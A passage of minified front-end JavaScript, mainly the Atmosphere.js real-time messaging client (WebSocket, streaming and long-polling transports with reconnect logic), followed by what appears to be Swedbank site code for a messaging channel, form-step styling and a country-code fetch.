_triggerOpen(rq){if(rq.isOpen)if(rq.isReopen)rq.isReopen=!1,_open("re-opening",rq.transport,rq);else{if("messageReceived"!==_response.state||"jsonp"!==rq.transport&&"long-polling"!==rq.transport)return;!function _openAfterResume(response){response.state="openAfterResume",_invokeFunction(response),response.state="messageReceived"}(_response)}else rq.isOpen=!0,_open("opening",rq.transport,rq);!function _startHeartbeat(rq){null!=rq.heartbeatTimer&&clearTimeout(rq.heartbeatTimer);if(!isNaN(_heartbeatInterval)&&_heartbeatInterval>0){var _pushHeartbeat=function(){_canLog("debug")&&atmosphere.util.debug("Sending heartbeat"),_push(_heartbeatPadding),rq.heartbeatTimer=setTimeout(_pushHeartbeat,_heartbeatInterval)};rq.heartbeatTimer=setTimeout(_pushHeartbeat,_heartbeatInterval)}}(rq)}function _executeRequest(request){var rq=_request;if(null==request&&void 0===request||(rq=request),rq.lastIndex=0,rq.readyState=0,"jsonp"===rq.transport||rq.enableXDR&&atmosphere.util.checkCORSSupport())_jsonp(rq);else{if(atmosphere.util.browser.msie&&+atmosphere.util.browser.version.split(".")[0]<10){if("streaming"===rq.transport)return void(rq.enableXDR&&window.XDomainRequest?_ieXDR(rq):_ieStreaming(rq));if(rq.enableXDR&&window.XDomainRequest)return void _ieXDR(rq)}var reconnectFExec=function(force){if(rq.lastIndex=0,_requestCount++,force||rq.reconnect&&_requestCount<=rq.maxReconnectOnClose){var delay=force?0:request.reconnectInterval;_response.ffTryingReconnect=!0,_open("re-connecting",request.transport,request),_reconnect(ajaxRequest,rq,delay)}else _onError(0,"maxReconnectOnClose reached")},reconnectF=function(force){atmosphere._beforeUnloadState?(atmosphere.util.debug(new Date+" Atmosphere: reconnectF: execution delayed due to _beforeUnloadState flag"),setTimeout((function(){reconnectFExec(force)}),5e3)):reconnectFExec(force)};if(rq.force||rq.reconnect&&(-1===rq.maxRequest||rq.requestCount++<rq.maxRequest)){rq.force=!1;var ajaxRequest=atmosphere.util.xhr();ajaxRequest.hasData=!1,function _doRequest(ajaxRequest,request,create){var url=request.url;null!=request.dispatchUrl&&"POST"===request.method&&(url+=request.dispatchUrl);url=_attachHeaders(request,url),url=atmosphere.util.prepareURL(url),create&&(ajaxRequest.open(request.method,url,request.async),request.connectTimeout>0&&(request.id=setTimeout((function(){0===request.requestCount&&(_clearState(),_prepareCallback("Connect timeout","closed",200,request.transport))}),request.connectTimeout)));_request.withCredentials&&"websocket"!==_request.transport&&"withCredentials"in ajaxRequest&&(ajaxRequest.withCredentials=!0);_request.dropHeaders||(ajaxRequest.setRequestHeader("X-Atmosphere-Framework",atmosphere.version),ajaxRequest.setRequestHeader("X-Atmosphere-Transport",request.transport),null!==request.heartbeat&&null!==request.heartbeat.server&&ajaxRequest.setRequestHeader("X-Heartbeat-Server",ajaxRequest.heartbeat.server),request.trackMessageLength&&ajaxRequest.setRequestHeader("X-Atmosphere-TrackMessageSize","true"),ajaxRequest.setRequestHeader("X-Atmosphere-tracking-id",request.uuid),atmosphere.util.each(request.headers,(function(name,value){var h=atmosphere.util.isFunction(value)?value.call(this,ajaxRequest,request,create,_response):value;null!=h&&ajaxRequest.setRequestHeader(name,h)})));""!==request.contentType&&ajaxRequest.setRequestHeader("Content-Type",request.contentType)}(ajaxRequest,rq,!0),rq.suspend&&(_activeRequest=ajaxRequest),"polling"!==rq.transport&&(_response.transport=rq.transport,ajaxRequest.onabort=function(){_debug("ajaxrequest.onabort"),_invokeClose(!0)},ajaxRequest.onerror=function(){_debug("ajaxrequest.onerror"),_response.error=!0,_response.ffTryingReconnect=!0;try{_response.status=XMLHttpRequest.status}catch(e){_response.status=500}_response.status||(_response.status=500),_response.errorHandled||(_clearState(),reconnectF(!1))}),ajaxRequest.onreadystatechange=function(){if(_debug("ajaxRequest.onreadystatechange, new state: "+ajaxRequest.readyState),_abortingConnection)_debug("onreadystatechange has been ignored due to _abortingConnection flag");else{_response.error=null;var skipCallbackInvocation=!1,update=!1;if("streaming"===rq.transport&&rq.readyState>2&&4===ajaxRequest.readyState)return _clearState(),void reconnectF(!1);if(rq.readyState=ajaxRequest.readyState,("streaming"===rq.transport&&ajaxRequest.readyState>=3||"long-polling"===rq.transport&&4===ajaxRequest.readyState)&&(update=!0),_timeout(_request),"polling"!==rq.transport){var status=200;if(4===ajaxRequest.readyState&&(status=ajaxRequest.status>1e3?0:ajaxRequest.status),!rq.reconnectOnServerError&&status>=300&&status<600)return void _onError(status,ajaxRequest.statusText);if(status>=300||0===status)return _response.errorHandled=!0,_clearState(),void reconnectF(!1);rq.enableProtocol&&request.firstMessage||2!==ajaxRequest.readyState||(atmosphere.util.browser.mozilla&&_response.ffTryingReconnect?(_response.ffTryingReconnect=!1,setTimeout((function(){_response.ffTryingReconnect||_triggerOpen(rq)}),500)):_triggerOpen(rq))}else 4===ajaxRequest.readyState&&(update=!0);if(update){var responseText=ajaxRequest.responseText;if(_response.errorHandled=!1,"long-polling"===rq.transport&&0===atmosphere.util.trim(responseText).length)return void(ajaxRequest.hasData?ajaxRequest.hasData=!1:reconnectF(!0));if(ajaxRequest.hasData=!0,_readHeaders(ajaxRequest,_request),"streaming"===rq.transport)if(atmosphere.util.browser.opera)atmosphere.util.iterate((function(){if(500!==_response.status&&ajaxRequest.responseText.length>rq.lastIndex){try{_response.status=ajaxRequest.status,_response.headers=atmosphere.util.parseHeaders(ajaxRequest.getAllResponseHeaders()),_readHeaders(ajaxRequest,_request)}catch(e){_response.status=404}_timeout(_request),_response.state="messageReceived";var message=ajaxRequest.responseText.substring(rq.lastIndex);if(rq.lastIndex=ajaxRequest.responseText.length,(skipCallbackInvocation=_trackMessageSize(message,rq,_response))||_invokeCallback(),_verifyStreamingLength(ajaxRequest,rq))return void _reconnectOnMaxStreamingLength(ajaxRequest,rq)}else if(_response.status>400)return rq.lastIndex=ajaxRequest.responseText.length,!1}),0);else{var message=responseText.substring(rq.lastIndex,responseText.length);if(skipCallbackInvocation=_trackMessageSize(message,rq,_response),rq.lastIndex=responseText.length,skipCallbackInvocation)return}else skipCallbackInvocation=_trackMessageSize(responseText,rq,_response);var closeStream=_verifyStreamingLength(ajaxRequest,rq);try{_response.status=ajaxRequest.status,_response.headers=atmosphere.util.parseHeaders(ajaxRequest.getAllResponseHeaders()),_readHeaders(ajaxRequest,rq)}catch(e){_response.status=404}rq.suspend?_response.state=0===_response.status?"closed":"messageReceived":_response.state="messagePublished";var isAllowedToReconnect=!closeStream&&"streaming"!==request.transport&&"polling"!==request.transport;isAllowedToReconnect&&!rq.executeCallbackBeforeReconnect&&_reconnect(ajaxRequest,rq,rq.pollingInterval),0===_response.responseBody.length||skipCallbackInvocation||_invokeCallback(),isAllowedToReconnect&&rq.executeCallbackBeforeReconnect&&_reconnect(ajaxRequest,rq,rq.pollingInterval),closeStream&&_reconnectOnMaxStreamingLength(ajaxRequest,rq)}}};try{ajaxRequest.send(rq.data),_subscribed=!0}catch(e){atmosphere.util.log(rq.logLevel,["Unable to connect to "+rq.url]),_onError(0,e)}}else"debug"===rq.logLevel&&atmosphere.util.log(rq.logLevel,["Max re-connection reached."]),_onError(0,"maxRequest reached")}}function _reconnectOnMaxStreamingLength(ajaxRequest,rq){_response.messages=[],rq.isReopen=!0,_close(),_abortingConnection=!1,_reconnect(ajaxRequest,rq,500)}function _reconnect(ajaxRequest,request,delay){if(!_response.closedByClientTimeout&&(request.reconnect||request.suspend&&_subscribed)){var status=0;ajaxRequest&&ajaxRequest.readyState>1&&(status=ajaxRequest.status>1e3?0:ajaxRequest.status),_response.status=0===status?204:status,_response.reason=0===status?"Server resumed the connection or down.":"OK",clearTimeout(request.id),request.reconnectId&&(clearTimeout(request.reconnectId),delete request.reconnectId),delay>0?_request.reconnectId=setTimeout((function(){_executeRequest(request)}),delay):_executeRequest(request)}}function _ieXDR(request){"polling"!==request.transport?(_ieStream=_configureXDR(request)).open():_configureXDR(request).open()}function _configureXDR(request){var rq=_request;null!=request&&void 0!==request&&(rq=request);var transport=rq.transport,lastIndex=0,xdr=new window.XDomainRequest,reconnect=function(){"long-polling"===rq.transport&&rq.reconnect&&(-1===rq.maxRequest||rq.requestCount++<rq.maxRequest)&&(xdr.status=200,_ieXDR(rq))},rewriteURL=rq.rewriteURL||function(url){var match=/(?:^|;\s*)(JSESSIONID|PHPSESSID)=([^;]*)/.exec(document.cookie);switch(match&&match[1]){case"JSESSIONID":return url.replace(/;jsessionid=[^\?]*|(\?)|$/,";jsessionid="+match[2]+"$1");case"PHPSESSID":return url.replace(/\?PHPSESSID=[^&]*&?|\?|$/,"?PHPSESSID="+match[2]+"&").replace(/&$/,"")}return url};xdr.onprogress=function(){handle(xdr)},xdr.onerror=function(){"polling"!==rq.transport&&(_clearState(),_requestCount++<rq.maxReconnectOnClose?rq.reconnectInterval>0?rq.reconnectId=setTimeout((function(){_open("re-connecting",request.transport,request),_ieXDR(rq)}),rq.reconnectInterval):(_open("re-connecting",request.transport,request),_ieXDR(rq)):_onError(0,"maxReconnectOnClose reached"))},xdr.onload=function(){};var handle=function(xdr){clearTimeout(rq.id);var message=xdr.responseText;if(message=message.substring(lastIndex),lastIndex+=message.length,"polling"!==transport){_timeout(rq);var skipCallbackInvocation=_trackMessageSize(message,rq,_response);if("long-polling"===transport&&0===atmosphere.util.trim(message).length)return;rq.executeCallbackBeforeReconnect&&reconnect(),skipCallbackInvocation||_prepareCallback(_response.responseBody,"messageReceived",200,transport),rq.executeCallbackBeforeReconnect||reconnect()}};return{open:function(){var url=rq.url;null!=rq.dispatchUrl&&(url+=rq.dispatchUrl),url=_attachHeaders(rq,url),xdr.open(rq.method,rewriteURL(url)),"GET"===rq.method?xdr.send():xdr.send(rq.data),rq.connectTimeout>0&&(rq.id=setTimeout((function(){0===rq.requestCount&&(_clearState(),_prepareCallback("Connect timeout","closed",200,rq.transport))}),rq.connectTimeout))},close:function(){xdr.abort()}}}function _ieStreaming(request){_ieStream=function _configureIE(request){var stop,rq=_request;null!=request&&void 0!==request&&(rq=request);var doc=new window.ActiveXObject("htmlfile");doc.open(),doc.close();var url=rq.url;null!=rq.dispatchUrl&&(url+=rq.dispatchUrl);"polling"!==rq.transport&&(_response.transport=rq.transport);return{open:function(){var iframe=doc.createElement("iframe");url=_attachHeaders(rq),""!==rq.data&&(url+="&X-Atmosphere-Post-Body="+encodeURIComponent(rq.data)),url=atmosphere.util.prepareURL(url),iframe.src=url,doc.body.appendChild(iframe);var cdoc=iframe.contentDocument||iframe.contentWindow.document;stop=atmosphere.util.iterate((function(){try{if(!cdoc.firstChild)return;var res=cdoc.body?cdoc.body.lastChild:cdoc;res.omgThisIsBroken;var readResponse=function(){var clone=res.cloneNode(!0);clone.appendChild(cdoc.createTextNode("."));var text=clone.innerText;return text=text.substring(0,text.length-1)};if(!cdoc.body||!cdoc.body.firstChild||"pre"!==cdoc.body.firstChild.nodeName.toLowerCase()){var head=cdoc.head||cdoc.getElementsByTagName("head")[0]||cdoc.documentElement||cdoc,script=cdoc.createElement("script");script.text="document.write('<plaintext>')",head.insertBefore(script,head.firstChild),head.removeChild(script),res=cdoc.body.lastChild}return rq.closed&&(rq.isReopen=!0),stop=atmosphere.util.iterate((function(){var text=readResponse();if(text.length>rq.lastIndex){if(_timeout(_request),_response.status=200,_response.error=null,res.innerText="",_trackMessageSize(text,rq,_response))return"";_prepareCallback(_response.responseBody,"messageReceived",200,rq.transport)}if(rq.lastIndex=0,"complete"===cdoc.readyState)return _invokeClose(!0),_open("re-connecting",rq.transport,rq),rq.reconnectInterval>0?rq.reconnectId=setTimeout((function(){_ieStreaming(rq)}),rq.reconnectInterval):_ieStreaming(rq),!1}),null),!1}catch(err){return _response.error=!0,_open("re-connecting",rq.transport,rq),_requestCount++<rq.maxReconnectOnClose?rq.reconnectInterval>0?rq.reconnectId=setTimeout((function(){_ieStreaming(rq)}),rq.reconnectInterval):_ieStreaming(rq):_onError(0,"maxReconnectOnClose reached"),doc.execCommand("Stop"),doc.close(),!1}}))},close:function(){stop&&stop(),doc.execCommand("Stop"),_invokeClose(!0)}}}(request),_ieStream.open()}function _push(message){null!=_localStorageService?function _pushLocal(message){_localStorageService.send(message)}(message):null!=_activeRequest||null!=_sse?_pushAjaxMessage(message):null!=_ieStream?function _pushIE(message){if(_request.enableXDR&&atmosphere.util.checkCORSSupport()){var rq=_getPushRequest(message);rq.reconnect=!1,_jsonp(rq)}else _pushAjaxMessage(message)}(message):null!=_jqxhr?function _pushJsonp(message){_pushAjaxMessage(message)}(message):null!=_websocket?function _pushWebSocket(message){var data,msg=atmosphere.util.isBinary(message)?message:_getStringMessage(message);try{if(data=null!=_request.dispatchUrl?_request.webSocketPathDelimiter+_request.dispatchUrl+_request.webSocketPathDelimiter+msg:msg,!_websocket.canSendMessage)return void atmosphere.util.error("WebSocket not connected.");_websocket.send(data)}catch(e){_websocket.onclose=function(message){},_clearState(),_reconnectWithFallbackTransport("Websocket failed. Downgrading to "+_request.fallbackTransport+" and resending "+message),_pushAjaxMessage(message)}}(message):(_onError(0,"No suspended connection available"),atmosphere.util.error("No suspended connection available. Make sure atmosphere.subscribe has been called and request.onOpen invoked before trying to push data"))}function _pushAjaxMessage(message){_executeRequest(_getPushRequest(message))}function _getStringMessage(message){var msg=message;return"object"==typeof msg&&(msg=message.data),msg}function _getPushRequest(message){var msg=_getStringMessage(message),rq={connected:!1,timeout:6e4,method:"POST",url:_request.url,contentType:_request.contentType,headers:_request.headers,reconnect:!0,callback:null,data:msg,suspend:!1,maxRequest:-1,logLevel:"info",requestCount:0,withCredentials:_request.withCredentials,async:_request.async,transport:"polling",isOpen:!0,attachHeadersAsQueryString:!0,enableXDR:_request.enableXDR,uuid:_request.uuid,dispatchUrl:_request.dispatchUrl,enableProtocol:!1,messageDelimiter:"|",trackMessageLength:_request.trackMessageLength,maxReconnectOnClose:_request.maxReconnectOnClose,heartbeatTimer:_request.heartbeatTimer,heartbeat:_request.heartbeat};return"object"==typeof message&&(rq=atmosphere.util.extend(rq,message)),rq}function _localMessage(message){var m=atmosphere.util.parseJSON(message);m.id!==guid&&(void 0!==_request.onLocalMessage?_request.onLocalMessage(m.event):void 0!==atmosphere.util.onLocalMessage&&atmosphere.util.onLocalMessage(m.event))}function _prepareCallback(messageBody,state,errorCode,transport){_response.responseBody=messageBody,_response.transport=transport,_response.status=errorCode,_response.state=state,_invokeCallback()}function _readHeaders(xdr,request){if(request.readResponsesHeaders)try{var tempUUID=xdr.getResponseHeader("X-Atmosphere-tracking-id");tempUUID&&null!=tempUUID&&(request.uuid=tempUUID.split(" ").pop())}catch(e){}else request.enableProtocol||(request.uuid=guid)}function _invokeFunction(response){_f(response,_request),_f(response,atmosphere.util)}function _f(response,f){switch(response.state){case"messageReceived":_debug("Firing onMessage"),_requestCount=0,void 0!==f.onMessage&&f.onMessage(response),void 0!==f.onmessage&&f.onmessage(response);break;case"error":_debug("Firing onError, reasonPhrase: "+(void 0!==response.reasonPhrase?response.reasonPhrase:"n/a")),void 0!==f.onError&&f.onError(response),void 0!==f.onerror&&f.onerror(response);break;case"opening":delete _request.closed,_debug("Firing onOpen"),void 0!==f.onOpen&&f.onOpen(response),void 0!==f.onopen&&f.onopen(response);break;case"messagePublished":_debug("Firing messagePublished"),void 0!==f.onMessagePublished&&f.onMessagePublished(response);break;case"re-connecting":_debug("Firing onReconnect"),void 0!==f.onReconnect&&f.onReconnect(_request,response);break;case"closedByClient":_debug("Firing closedByClient"),void 0!==f.onClientTimeout&&f.onClientTimeout(_request);break;case"re-opening":delete _request.closed,_debug("Firing onReopen"),void 0!==f.onReopen&&f.onReopen(_request,response);break;case"fail-to-reconnect":_debug("Firing onFailureToReconnect"),void 0!==f.onFailureToReconnect&&f.onFailureToReconnect(_request,response);break;case"unsubscribe":case"closed":void 0!==_request.closed&&_request.closed?_debug("Request already closed, not firing onClose ("+response.state+" case)"):(_debug("Firing onClose ("+response.state+" case)"),void 0!==f.onClose&&f.onClose(response),void 0!==f.onclose&&f.onclose(response)),_request.closed=!0;break;case"openAfterResume":void 0!==f.onOpenAfterResume&&f.onOpenAfterResume(_request)}}function _invokeClose(wasOpen){"closed"!==_response.state&&(_response.state="closed",_response.responseBody="",_response.messages=[],_response.status=wasOpen?200:501,_invokeCallback())}function _invokeCallback(){var call=function(index,func){func(_response)};null==_localStorageService&&null!=_localSocketF&&_localSocketF(_response.responseBody),_request.reconnect=_request.mrequest;for(var isString="string"==typeof _response.responseBody,messages=isString&&_request.trackMessageLength?_response.messages.length>0?_response.messages:[""]:new Array(_response.responseBody),i=0;i<messages.length;i++)if(!(messages.length>1&&0===messages[i].length||(_response.responseBody=isString?atmosphere.util.trim(messages[i]):messages[i],null==_localStorageService&&null!=_localSocketF&&_localSocketF(_response.responseBody),(0===_response.responseBody.length||isString&&_heartbeatPadding===_response.responseBody)&&"messageReceived"===_response.state))){if(_invokeFunction(_response),callbacks.length>0){_canLog("debug")&&atmosphere.util.debug("Invoking "+callbacks.length+" global callbacks: "+_response.state);try{atmosphere.util.each(callbacks,call)}catch(e){atmosphere.util.log(_request.logLevel,["Callback exception"+e])}}if("function"==typeof _request.callback){_canLog("debug")&&atmosphere.util.debug("Invoking request callbacks");try{_request.callback(_response)}catch(e){atmosphere.util.log(_request.logLevel,["Callback exception"+e])}}}}_subscribe(options),this.subscribe=function(options){_subscribe(options),_execute()},this.execute=function(){_execute()},this.close=function(){_close()},this.disconnect=function(){_disconnect()},this.getUrl=function(){return _request.url},this.push=function(message,dispatchUrl){if(null!=dispatchUrl){var originalDispatchUrl=_request.dispatchUrl;_request.dispatchUrl=dispatchUrl,_push(message),_request.dispatchUrl=originalDispatchUrl}else _push(message)},this.getUUID=function(){return _request.uuid},this.pushLocal=function(message){!function _intraPush(message){if(0!==message.length)try{_localStorageService?_localStorageService.localSend(message):_storageService&&_storageService.signal("localMessage",atmosphere.util.stringifyJSON({id:guid,event:message}))}catch(err){atmosphere.util.error(err)}}(message)},this.enableProtocol=function(message){return _request.enableProtocol},this.init=function(){_init()},this.request=_request,this.response=_response}},atmosphere.subscribe=function(url,callback,request){"function"==typeof callback&&atmosphere.addCallback(callback),"string"!=typeof url?request=url:request.url=url,uuid=void 0!==request&&void 0!==request.uuid?request.uuid:0;var rq=new atmosphere.AtmosphereRequest(request);return rq.execute(),requests[requests.length]=rq,rq},atmosphere.unsubscribe=function(){if(requests.length>0)for(var requestsClone=[].concat(requests),i=0;i<requestsClone.length;i++){var rq=requestsClone[i];rq.close(),clearTimeout(rq.response.request.id),rq.heartbeatTimer&&clearTimeout(rq.heartbeatTimer)}requests=[],callbacks=[]},atmosphere.unsubscribeUrl=function(url){var idx=-1;if(requests.length>0)for(var i=0;i<requests.length;i++){var rq=requests[i];if(rq.getUrl()===url){rq.close(),clearTimeout(rq.response.request.id),rq.heartbeatTimer&&clearTimeout(rq.heartbeatTimer),idx=i;break}}idx>=0&&requests.splice(idx,1)},atmosphere.addCallback=function(func){-1===atmosphere.util.inArray(func,callbacks)&&callbacks.push(func)},atmosphere.removeCallback=function(func){var index=atmosphere.util.inArray(func,callbacks);-1!==index&&callbacks.splice(index,1)},atmosphere.util={browser:{},parseHeaders:function(headerString){for(var match,rheaders=/^(.*?):[ \t]*([^\r\n]*)\r?$/gm,headers={};match=rheaders.exec(headerString);)headers[match[1]]=match[2];return headers},now:function(){return(new Date).getTime()},isArray:function(array){return"[object Array]"===Object.prototype.toString.call(array)},inArray:function(elem,array){if(!Array.prototype.indexOf){for(var len=array.length,i=0;i<len;++i)if(array[i]===elem)return i;return-1}return array.indexOf(elem)},isBinary:function(data){return/^\[object\s(?:Blob|ArrayBuffer|.+Array)\]$/.test(Object.prototype.toString.call(data))},isFunction:function(fn){return"[object Function]"===Object.prototype.toString.call(fn)},getAbsoluteURL:function(url){if(void 0===document.createElement)return url;var div=document.createElement("div");return div.innerHTML='<a href="'+url+'"/>',encodeURI(decodeURI(div.firstChild.href))},prepareURL:function(url){var ts=atmosphere.util.now(),ret=url.replace(/([?&])_=[^&]*/,"$1_="+ts);return ret+(ret===url?(/\?/.test(url)?"&":"?")+"_="+ts:"")},trim:function(str){return String.prototype.trim?str.toString().trim():str.toString().replace(/(?:(?:^|\n)\s+|\s+(?:$|\n))/g,"").replace(/\s+/g," ")},param:function(params){var prefix,s=[];function add(key,value){value=atmosphere.util.isFunction(value)?value():null==value?"":value,s.push(encodeURIComponent(key)+"="+encodeURIComponent(value))}function buildParams(prefix,obj){var name;if(atmosphere.util.isArray(obj))atmosphere.util.each(obj,(function(i,v){/\[\]$/.test(prefix)?add(prefix,v):buildParams(prefix+"["+("object"==typeof v?i:"")+"]",v)}));else if("[object Object]"===Object.prototype.toString.call(obj))for(name in obj)buildParams(prefix+"["+name+"]",obj[name]);else add(prefix,obj)}for(prefix in params)buildParams(prefix,params[prefix]);return s.join("&").replace(/%20/g,"+")},storage:function(){try{return!(!window.localStorage||!window.StorageEvent)}catch(e){return!1}},iterate:function(fn,interval){var timeoutId;return interval=interval||0,function loop(){timeoutId=setTimeout((function(){!1!==fn()&&loop()}),interval)}(),function(){clearTimeout(timeoutId)}},each:function(obj,callback,args){if(obj){var i=0,length=obj.length,isArray=atmosphere.util.isArray(obj);if(args){if(isArray)for(;i<length&&!1!==callback.apply(obj[i],args);i++);else for(i in obj)if(!1===callback.apply(obj[i],args))break}else if(isArray)for(;i<length&&!1!==callback.call(obj[i],i,obj[i]);i++);else for(i in obj)if(!1===callback.call(obj[i],i,obj[i]))break;return obj}},extend:function(target){var i,options,name;for(i=1;i<arguments.length;i++)if(null!=(options=arguments[i]))for(name in options)target[name]=options[name];return target},on:function(elem,type,fn){elem.addEventListener?elem.addEventListener(type,fn,!1):elem.attachEvent&&elem.attachEvent("on"+type,fn)},off:function(elem,type,fn){elem.removeEventListener?elem.removeEventListener(type,fn,!1):elem.detachEvent&&elem.detachEvent("on"+type,fn)},log:function(level,args){if(window.console){var logger=window.console[level];"function"==typeof logger&&logger.apply(window.console,args)}},warn:function(){atmosphere.util.log("warn",arguments)},info:function(){atmosphere.util.log("info",arguments)},debug:function(){atmosphere.util.log("debug",arguments)},error:function(){atmosphere.util.log("error",arguments)},xhr:function(){try{return new window.XMLHttpRequest}catch(e1){try{return new window.ActiveXObject("Microsoft.XMLHTTP")}catch(e2){}}},parseJSON:function(data){return data?window.JSON&&window.JSON.parse?window.JSON.parse(data):new Function("return "+data)():null},stringifyJSON:function(value){var escapable=/[\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,meta={"\b":"\\b","\t":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"};function quote(string){return'"'+string.replace(escapable,(function(a){var c=meta[a];return"string"==typeof c?c:"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4)}))+'"'}function f(n){return n<10?"0"+n:n}return window.JSON&&window.JSON.stringify?window.JSON.stringify(value):function str(key,holder){var i,v,len,partial,value=holder[key],type=typeof value;switch(value&&"object"==typeof value&&"function"==typeof value.toJSON&&(type=typeof(value=value.toJSON(key))),type){case"string":return quote(value);case"number":return isFinite(value)?String(value):"null";case"boolean":return String(value);case"object":if(!value)return"null";switch(Object.prototype.toString.call(value)){case"[object Date]":return isFinite(value.valueOf())?'"'+value.getUTCFullYear()+"-"+f(value.getUTCMonth()+1)+"-"+f(value.getUTCDate())+"T"+f(value.getUTCHours())+":"+f(value.getUTCMinutes())+":"+f(value.getUTCSeconds())+'Z"':"null";case"[object Array]":for(len=value.length,partial=[],i=0;i<len;i++)partial.push(str(i,value)||"null");return"["+partial.join(",")+"]";default:for(i in partial=[],value)hasOwn.call(value,i)&&(v=str(i,value))&&partial.push(quote(i)+":"+v);return"{"+partial.join(",")+"}"}}}("",{"":value})},checkCORSSupport:function(){if(atmosphere.util.browser.msie&&!window.XDomainRequest&&+atmosphere.util.browser.version.split(".")[0]<11)return!0;if(atmosphere.util.browser.opera&&+atmosphere.util.browser.version.split(".")<12)return!0;if("KreaTVWebKit/531"===atmosphere.util.trim(navigator.userAgent).slice(0,16))return!0;if("kreatel"===atmosphere.util.trim(navigator.userAgent).slice(-7).toLowerCase())return!0;var androidVersionMatches=navigator.userAgent.toLowerCase().match(/.+android ([0-9]{1,2})/i),majorVersion=parseInt(androidVersionMatches&&androidVersionMatches[0]||-1,10);return!isNaN(majorVersion)&&majorVersion>-1&&majorVersion<3}},atmosphere.util.now(),ua=navigator.userAgent.toLowerCase(),"safari"===(match=/(chrome)[ \/]([\w.]+)/.exec(ua)||/(opera)(?:.*version|)[ \/]([\w.]+)/.exec(ua)||/(msie) ([\w.]+)/.exec(ua)||/(trident)(?:.*? rv:([\w.]+)|)/.exec(ua)||ua.indexOf("android")<0&&/version\/(.+) (safari)/.exec(ua)||ua.indexOf("compatible")<0&&/(mozilla)(?:.*? rv:([\w.]+)|)/.exec(ua)||[])[2]&&(match[2]=match[1],match[1]="safari"),atmosphere.util.browser[match[1]||""]=!0,atmosphere.util.browser.version=match[2]||"0",atmosphere.util.browser.vmajor=atmosphere.util.browser.version.split(".")[0],atmosphere.util.browser.trident&&(atmosphere.util.browser.msie=!0),(atmosphere.util.browser.msie||atmosphere.util.browser.mozilla&&1==+atmosphere.util.browser.version.split(".")[0])&&(atmosphere.util.storage=!1),atmosphere.callbacks={unload:function(){atmosphere.util.debug(new Date+" Atmosphere: unload event"),atmosphere.unsubscribe()},beforeUnload:function(){atmosphere.util.debug(new Date+" Atmosphere: beforeunload event"),atmosphere._beforeUnloadState=!0,setTimeout((function(){atmosphere.util.debug(new Date+" Atmosphere: beforeunload event timeout reached. Reset _beforeUnloadState flag"),atmosphere._beforeUnloadState=!1}),5e3)},offline:function(){if(atmosphere.util.debug(new Date+" Atmosphere: offline event"),offline=!0,requests.length>0)for(var requestsClone=[].concat(requests),i=0;i<requestsClone.length;i++){var rq=requestsClone[i];rq.request.handleOnlineOffline&&(rq.close(),clearTimeout(rq.response.request.id),rq.heartbeatTimer&&clearTimeout(rq.heartbeatTimer))}},online:function(){if(atmosphere.util.debug(new Date+" Atmosphere: online event"),requests.length>0)for(var i=0;i<requests.length;i++)requests[i].request.handleOnlineOffline&&(requests[i].init(),requests[i].execute());offline=!1}},atmosphere.bindEvents=function(){atmosphere.util.on(window,"unload",atmosphere.callbacks.unload),atmosphere.util.on(window,"beforeunload",atmosphere.callbacks.beforeUnload),atmosphere.util.on(window,"offline",atmosphere.callbacks.offline),atmosphere.util.on(window,"online",atmosphere.callbacks.online)},atmosphere.unbindEvents=function(){atmosphere.util.off(window,"unload",atmosphere.callbacks.unload),atmosphere.util.off(window,"beforeunload",atmosphere.callbacks.beforeUnload),atmosphere.util.off(window,"offline",atmosphere.callbacks.offline),atmosphere.util.off(window,"online",atmosphere.callbacks.online)},atmosphere.bindEvents(),atmosphere})),IOChannel=function(){if(IOChannel.instance)return IOChannel.instance;IOChannel.instance=this,this.signals={},this.socket=null;var IOMessage=function(signal,content){this.signal=signal,this.content=content};this.connectAsync=function(){var request={url:"https://"+window.location.host+"/ajax;jsessionid="+Swedbank.Navigation.getSessionId(),transport:"websocket",fallbackTransport:"streaming",contentType:"application/json;charset=UTF-8",rewriteURL:!0,dropHeaders:!0,trackMessageLength:!0,timeout:45e3,reconnectInterval:1e4,connectTimeout:-1,heartbeatTimer:8e3,pollingInterval:3e3,attachHeadersAsQueryString:!0,onMessage:function(response){var message=JSON.parse(response.responseBody);message&&IOChannel.instance.call(message.signal,message)},onopen:function(response){jQuery(document).on("messageSendEvent",(function(event,triggerParam){IOChannel.instance.send("message",triggerParam)})),jQuery(document).trigger("communicationChannelReady")}};IOChannel.instance.socket=atmosphere.subscribe(request)},this.on=function(signal,operation){this.signals[signal]=operation},this.call=function(receivedSignal,data){for(var registeredSignal in this.signals)if(receivedSignal===registeredSignal){return(0,this.signals[receivedSignal])(data)}console.log("Event "+event+" do not have defined function")},this.send=function(signal,content){var json=JSON.stringify(new IOMessage(signal,content));IOChannel.instance.socket.push(json)},this.disconnect=function(webrtc,event){},this.init=function(){this.on("ready",(function(message){})),this.on("resume",(function(message){})),this.on("ping",(function(message){})),this.on("message",(function(message){if(message){var json=jQuery.parseJSON(message.content);json&&jQuery(document).trigger("messageReceivedEvent",json)}}))},this.init()},function($){const pageStartCallback=()=>{renderFormSteps(),$('input[type="file"]').each((function(){this.closest("ui-upload")||transformFileInput($(this))}))};Swedbank.isUiSpaEnabled?(SharedComponents.eventBus.addEventListener("spa-navigation-complete",pageStartCallback),UI.whenDOMReady(pageStartCallback)):Swedbank.PageLoad.onEach(pageStartCallback)}(jQuery);var renderedFormSteps=[];function renderFormSteps(){var formSteps=document.querySelectorAll(".form-steps");formSteps.length&&(renderedFormSteps=renderedFormSteps.concat(formSteps));var agreementStepsTab=document.getElementById("agreementStepsTab");agreementStepsTab&&renderedFormSteps.push(agreementStepsTab);var agreementStepsTabs=document.querySelectorAll(".agreementStepsTab");agreementStepsTabs.length&&(renderedFormSteps=renderedFormSteps.concat(agreementStepsTabs)),renderedFormSteps.length&&[].forEach.call(renderedFormSteps,(function(element){stylizeFormSteps(jQuery(element)),document.addEventListener("widthchange",(function(){stylizeFormSteps(jQuery(element))}))}))}window.addEventListener("resize",SharedComponents.helpers.throttle((function(){document.dispatchEvent(new CustomEvent("widthchange"))}),300));var Swedbank=Swedbank||{};!function(exports){exports.Countries=class Countries{static fetch(){const params=Object.assign({},getSessionParams(),{pageId:"shared.ajaxResponse",getCountriesDialInfo:!0}),storageKey=`countriesCodesStorage:${params.language}`,rest=Swedbank.RestService.get(),cachedCountries=Swedbank.localStorage.get(storageKey);return new 